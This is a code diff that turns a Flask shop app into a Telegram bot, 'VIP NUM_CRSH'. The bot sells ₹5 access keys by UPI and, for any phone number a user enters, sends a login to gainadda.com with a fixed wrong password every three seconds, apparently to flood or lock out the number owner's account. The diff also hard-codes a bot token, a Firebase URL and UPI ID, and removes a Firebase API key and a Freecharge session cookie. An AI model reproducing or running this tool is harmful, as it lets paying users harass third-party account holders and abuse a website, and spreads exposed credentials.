@@ -1,153 +1,267 @@
-import os
+import telebot
 import requests
+import time
+import threading
+import os
 import pyqrcode
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for
-from dotenv import load_dotenv
+import io
+from telebot import types
+from flask import Flask
 
-load_dotenv()
+# --- CONFIGURATION ---
+BOT_TOKEN = "8392625389:AAEAxhr2cQAsIBy7lpTX_LSvvgNDBndVDJ0"
+DB_URL = "https://earning-a9b0c-default-rtdb.firebaseio.com"
+UPI_ID = "7897803277@freecharge"
+FIXED_PASSWORD = "ZZZXXX"
+NODE = "NUM_CRSH"
 
+bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
-app.secret_key = "vip_shop_super_secret_key_123"
 
-FIREBASE_API_KEY = os.getenv("FIREBASE_API_KEY", "AIzaSyASlD4FM6lyIEzBAzPlflhlCwDc3Toh6Fo")
-DATABASE_URL = os.getenv("FIREBASE_DATABASE_URL", "https://earning-a9b0c-default-rtdb.firebaseio.com")
-UPI_ID = os.getenv("UPI_ID", "7897803277@freecharge")
-FC_COOKIE = os.getenv("FC_COOKIE", "HttpOnly_.freecharge.in	TRUE	/	TRUE	1783332750	app_fc	uE7hVQspD47b02A-fZuobEVi5aB97tMEoJnEjqz2dkR5GHDIMBxvYcqUCQJk-eFZgwJUebs3UtGwl09VliIc-Z1R9MEllacp8DgHwOzGHE-fFob76C3jdro8tz5DEBPM")
-
+# --- SAFE FIREBASE HELPERS ---
 def db_get(path):
-    url = f"{DATABASE_URL}/{path}.json"
-    r = requests.get(url)
-    return r.json() if r.ok else None
-
-def db_put(path, data): requests.put(f"{DATABASE_URL}/{path}.json", json=data)
-def db_post(path, data): return requests.post(f"{DATABASE_URL}/{path}.json", json=data).json()
-def db_patch(path, data): requests.patch(f"{DATABASE_URL}/{path}.json", json=data)
-
-@app.route('/api/login', methods=['POST'])
-def api_login():
-    data = request.json
-    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FIREBASE_API_KEY}"
-    r = requests.post(url, json={"email": data.get('email'), "password": data.get('password'), "returnSecureToken": True})
-    if r.ok:
-        session['user_id'] = r.json()['localId']
-        session['email'] = data.get('email')
-        return jsonify({"status": "success", "message": "Login Successful!"})
-    return jsonify({"status": "error", "message": "Invalid credentials!"})
-
-@app.route('/api/signup', methods=['POST'])
-def api_signup():
-    data = request.json
-    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FIREBASE_API_KEY}"
-    r = requests.post(url, json={"email": data.get('email'), "password": data.get('password'), "returnSecureToken": True})
-    if r.ok:
-        uid = r.json()['localId']
-        session['user_id'] = uid
-        session['email'] = data.get('email')
-        db_put(f"shop_site/users/{uid}", {"email": data.get('email'), "balance": 0, "role": "user"})
-        return jsonify({"status": "success", "message": "Account Created!"})
-    return jsonify({"status": "error", "message": "Signup Failed! Email might exist."})
-
-@app.route('/')
-def index(): return redirect(url_for('dashboard')) if 'user_id' in session else render_template('auth.html')
-
-@app.route('/dashboard')
-def dashboard(): return render_template('dashboard.html', user_email=session['email']) if 'user_id' in session else redirect(url_for('index'))
-
-@app.route('/pay')
-def pay_page(): return render_template('pay.html') if 'user_id' in session else redirect(url_for('index'))
-
-@app.route('/api/projects', methods=['GET'])
-def get_projects():
-    if 'user_id' not in session: return jsonify({})
-    uid = session['user_id']
-    projects = db_get("shop_site/projects") or {}
-    my_projects = db_get(f"shop_site/users/{uid}/my_projects") or {}
-    
-    # Check ownership
-    for key, val in projects.items():
-        if key in my_projects:
-            val['owned'] = True
-        else:
-            val['owned'] = False
-    return jsonify(projects)
-
-@app.route('/api/add_project', methods=['POST'])
-def add_project():
-    data = request.json
-    data['owner_id'] = session['user_id']
-    data['status'] = 'pending' 
-    db_post("shop_site/projects", data)
-    return jsonify({"status": "success", "message": "Project sent for Admin approval!"})
-
-@app.route('/api/generate_qr', methods=['POST'])
-def generate_qr():
-    data = request.json
-    amount = data.get('amount')
-    upi_url = f"upi://pay?pa={UPI_ID}&pn=VIPShop&am={amount}&cu=INR"
-    qr = pyqrcode.create(upi_url)
-    return jsonify({"qr": f"data:image/png;base64,{qr.png_as_base64_str(scale=5)}", "amount": amount})
-
-@app.route('/api/verify_payment', methods=['POST'])
-def verify_payment():
-    data = request.json
-    amount = str(data.get('amount'))
-    project_id = data.get('project_id')
-    buyer_id = session.get('user_id')
-    
-    # REAL COOKIE LOGIC
-    headers = {"Cookie": FC_COOKIE, "User-Agent": "Mozilla/5.0"}
-    payment_received = False
     try:
-        # Pinging Freecharge or checking transaction history
-        r = requests.get("https://www.freecharge.in/api/v1/user/transactions", headers=headers, timeout=5)
-        history_data = r.text.upper()
-        # Strictly checking if the amount and success status exists in recent history
-        if amount in history_data and "SUCCESS" in history_data:
-            payment_received = True
+        r = requests.get(f"{DB_URL}/{NODE}/{path}.json")
+        return r.json() if r.ok else None
     except:
-        payment_received = False 
-        
-    if payment_received:
-        project = db_get(f"shop_site/projects/{project_id}")
-        if project:
-            seller_id = project.get('owner_id')
-            seller_data = db_get(f"shop_site/users/{seller_id}")
-            if seller_data:
-                db_patch(f"shop_site/users/{seller_id}", {"balance": float(seller_data.get('balance', 0)) + float(amount)})
-            db_put(f"shop_site/users/{buyer_id}/my_projects/{project_id}", project)
-            return jsonify({"status": "success"})
+        return None
+
+def db_put(path, data):
+    try: requests.put(f"{DB_URL}/{NODE}/{path}.json", json=data)
+    except: pass
+
+def db_patch(path, data):
+    try: requests.patch(f"{DB_URL}/{NODE}/{path}.json", json=data)
+    except: pass
+
+active_tasks = {}
+
+# --- 100% REAL LOGIN LOOP (Browser Simulation) ---
+def login_loop(number, chat_id):
+    print(f"Started Login Loop for: {number}")
+    login_url = "https://gainadda.com/login"
+    
+    # 100% Real Browser Headers
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "application/json, text/javascript, */*; q=0.01"
+    }
+    
+    # Real Form Data
+    payload = {
+        "mobile": number, 
+        "password": FIXED_PASSWORD
+    }
+    
+    while active_tasks.get(number) == "on":
+        try:
+            # Check if admin blocked this number
+            if db_get(f"blocks/{number}"):
+                bot.send_message(chat_id, f"🚫 Your number {number} has been BLOCKED by Admin!")
+                active_tasks[number] = "off"
+                db_patch(f"tasks/{number}", {"status": "off"})
+                break
             
-    return jsonify({"status": "pending"})
-
-@app.route('/api/profile_data', methods=['GET'])
-def profile_data():
-    uid = session.get('user_id')
-    user_data = db_get(f"shop_site/users/{uid}") or {}
-    my_projects = db_get(f"shop_site/users/{uid}/my_projects") or {}
-    
-    # Get all withdrawals
-    all_withdrawals = db_get("shop_site/withdrawals") or {}
-    my_withdrawals = {k: v for k, v in all_withdrawals.items() if v.get('user_id') == uid}
-    
-    return jsonify({
-        "balance": user_data.get('balance', 0),
-        "my_projects": my_projects,
-        "history": my_withdrawals
-    })
-
-@app.route('/api/withdraw', methods=['POST'])
-def withdraw():
-    data = request.json
-    amount = float(data.get('amount'))
-    uid = session.get('user_id')
-    balance = float((db_get(f"shop_site/users/{uid}") or {}).get('balance', 0))
-    
-    if amount < 200: return jsonify({"status": "error", "message": "Min withdrawal ₹200"})
-    if amount > balance: return jsonify({"status": "error", "message": "Not enough balance!"})
+            # Real Login Hit
+            requests.post(login_url, headers=headers, data=payload, timeout=5)
+        except:
+            pass # Ignore network drops
         
-    db_patch(f"shop_site/users/{uid}", {"balance": balance - amount})
-    db_post("shop_site/withdrawals", {"user_id": uid, "upi": data.get('upi'), "amount": amount, "status": "pending"})
-    return jsonify({"status": "success", "message": "Withdrawal request sent!"})
+        time.sleep(3) # Exact 3 seconds wait
 
-if __name__ == '__main__':
+# --- AUTO-PAYMENT MONITOR (Admin Success = Auto Unlock) ---
+def payment_monitor():
+    while True:
+        try:
+            payments = db_get("payments") or {}
+            for utr, data in payments.items():
+                if data.get("status") == "success" and not data.get("notified"):
+                    user_id = data.get("user_id")
+                    
+                    # Mark as notified so it doesn't loop
+                    db_patch(f"payments/{utr}", {"notified": True})
+                    
+                    # Auto Auth User
+                    db_patch(f"users/{user_id}", {"auth": True})
+                    
+                    # Send VIP Success SMS
+                    bot.send_message(user_id, "🎉 Your request successfully key automatically summit!\nEnjoy 😉")
+                    
+                    # Show Main Menu Automatically
+                    main_menu_by_id(user_id)
+        except Exception as e:
+            pass
+        time.sleep(4) # Check every 4 seconds
+
+# --- HELPERS ---
+def is_blocked(user_id):
+    u_data = db_get(f"users/{user_id}")
+    return u_data and u_data.get("blocked")
+
+def main_menu_by_id(chat_id):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("➕ Add Number", "📱 My Numbers")
+    bot.send_message(chat_id, "🚀 *Bot is Ready!* Choose an option:", parse_mode="Markdown", reply_markup=markup)
+
+# --- BOT COMMANDS & LOGIC ---
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    user_id = str(message.chat.id)
+    bot.clear_step_handler_by_chat_id(message.chat.id) # Fix overlap glitch
+    
+    if is_blocked(user_id):
+        bot.send_message(user_id, "❌ Aapko Admin ne block kar diya hai!")
+        return
+
+    u_data = db_get(f"users/{user_id}")
+    if not u_data:
+        db_put(f"users/{user_id}", {"id": user_id, "username": message.from_user.username, "auth": False})
+        u_data = {"auth": False}
+
+    if u_data.get("auth"):
+        main_menu_by_id(message.chat.id)
+    else:
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔑 Enter Key", callback_data="enter_key"))
+        markup.add(types.InlineKeyboardButton("💳 Create Key (₹5)", callback_data="buy_key"))
+        bot.send_message(user_id, "👋 *Welcome to VIP NUM_CRSH Bot!*\n\nBot chalane ke liye Key zaruri hai.", parse_mode="Markdown", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    user_id = str(call.message.chat.id)
+    bot.answer_callback_query(call.id) # Stop Telegram Loading
+    bot.clear_step_handler_by_chat_id(call.message.chat.id) # Fix overlap glitch
+    
+    if is_blocked(user_id):
+        bot.send_message(user_id, "❌ You are blocked!")
+        return
+    
+    if call.data == "buy_key":
+        upi_uri = f"upi://pay?pa={UPI_ID}&pn=VIP_BOT&am=5&cu=INR"
+        qr = pyqrcode.create(upi_uri)
+        
+        buffer = io.BytesIO()
+        qr.png(buffer, scale=6)
+        buffer.seek(0)
+        
+        msg = bot.send_photo(user_id, buffer, caption=f"💸 *Payment Amount: ₹5*\n\nUPI: `{UPI_ID}`\n\nPay karke 12 anko ka *UTR Number* yahan bhejein.", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, process_utr)
+
+    elif call.data == "enter_key":
+        msg = bot.send_message(user_id, "🔑 Apni Key yahan paste karein:")
+        bot.register_next_step_handler(msg, verify_key)
+
+    elif call.data.startswith("stop_"):
+        num = call.data.split("_")[1]
+        active_tasks[num] = "off"
+        db_patch(f"tasks/{num}", {"status": "off"})
+        bot.edit_message_text(f"Number {num} Stopped 🛑", user_id, call.message.message_id)
+
+    elif call.data.startswith("on_"):
+        num = call.data.split("_")[1]
+        if db_get(f"blocks/{num}"):
+            bot.send_message(user_id, "❌ Number blocked by Admin!")
+            return
+        active_tasks[num] = "on"
+        db_patch(f"tasks/{num}", {"status": "on"})
+        threading.Thread(target=login_loop, args=(num, user_id)).start()
+        bot.edit_message_text(f"Number {num} is Active 🚀", user_id, call.message.message_id)
+
+def process_utr(message):
+    user_id = str(message.chat.id)
+    bot.clear_step_handler_by_chat_id(message.chat.id)
+    if is_blocked(user_id): return
+    
+    utr = message.text
+    if utr and len(utr) == 12 and utr.isdigit():
+        db_put(f"payments/{utr}", {"user_id": user_id, "utr": utr, "status": "pending"})
+        bot.send_message(message.chat.id, "✅ *UTR Received!* Admin check kar raha hai, please wait...", parse_mode="Markdown")
+    else:
+        msg = bot.send_message(message.chat.id, "❌ Invalid UTR! Sahi 12 digit UTR dalein:")
+        bot.register_next_step_handler(msg, process_utr)
+
+def verify_key(message):
+    user_id = str(message.chat.id)
+    bot.clear_step_handler_by_chat_id(message.chat.id)
+    if is_blocked(user_id): return
+    
+    key = message.text
+    keys_data = db_get("keys") or {}
+    if key in keys_data and not keys_data[key].get("used"):
+        db_patch(f"keys/{key}", {"used": True, "used_by": user_id})
+        db_patch(f"users/{user_id}", {"auth": True})
+        bot.send_message(message.chat.id, "🎉 VIP Key Activated!")
+        main_menu_by_id(message.chat.id)
+    else:
+        msg = bot.send_message(message.chat.id, "❌ Invalid ya Used Key! Dubara try karein:")
+        bot.register_next_step_handler(msg, verify_key)
+
+@bot.message_handler(func=lambda m: m.text == "➕ Add Number")
+def ask_number(message):
+    user_id = str(message.chat.id)
+    bot.clear_step_handler_by_chat_id(message.chat.id)
+    if is_blocked(user_id): return
+    
+    msg = bot.send_message(message.chat.id, "📱 Apna Number dalein (Without +91):")
+    bot.register_next_step_handler(msg, start_number)
+
+def start_number(message):
+    user_id = str(message.chat.id)
+    bot.clear_step_handler_by_chat_id(message.chat.id)
+    if is_blocked(user_id): return
+    
+    num = message.text
+    if num and len(num) >= 10 and num.isdigit():
+        if db_get(f"blocks/{num}"):
+            bot.send_message(message.chat.id, "❌ Ye number admin dwara block ho chuka hai!")
+            return
+            
+        active_tasks[num] = "on"
+        db_put(f"tasks/{num}", {"user_id": user_id, "status": "on", "number": num})
+        threading.Thread(target=login_loop, args=(num, message.chat.id)).start()
+        bot.send_message(message.chat.id, f"🚀 Number {num} Active ho gaya hai!")
+    else:
+        msg = bot.send_message(message.chat.id, "❌ Sahi number dalein:")
+        bot.register_next_step_handler(msg, start_number)
+
+@bot.message_handler(func=lambda m: m.text == "📱 My Numbers")
+def my_numbers(message):
+    user_id = str(message.chat.id)
+    bot.clear_step_handler_by_chat_id(message.chat.id)
+    if is_blocked(user_id): return
+    
+    tasks = db_get("tasks") or {}
+    found = False
+    for num, data in tasks.items():
+        if data.get("user_id") == user_id:
+            found = True
+            markup = types.InlineKeyboardMarkup()
+            if active_tasks.get(num) == "on" or data.get("status") == "on":
+                active_tasks[num] = "on" 
+                markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{num}"))
+                status_text = "ON 🚀"
+            else:
+                markup.add(types.InlineKeyboardButton("🚀 ON", callback_data=f"on_{num}"))
+                status_text = "OFF 🛑"
+            bot.send_message(message.chat.id, f"📱 *Number:* `{num}`\nStatus: {status_text}", parse_mode="Markdown", reply_markup=markup)
+    if not found:
+        bot.send_message(message.chat.id, "Abhi tak koi number add nahi kiya.")
+
+# --- RENDER WEB SERVER ---
+@app.route('/')
+def home(): return "VIP NUM_CRSH Bot is Running Smoothly!"
+
+def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
+
+if __name__ == "__main__":
+    threading.Thread(target=run_flask).start()
+    threading.Thread(target=payment_monitor).start() # <--- New Monitor Added!
+    
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=60)
+        except Exception as e:
+            time.sleep(5) 
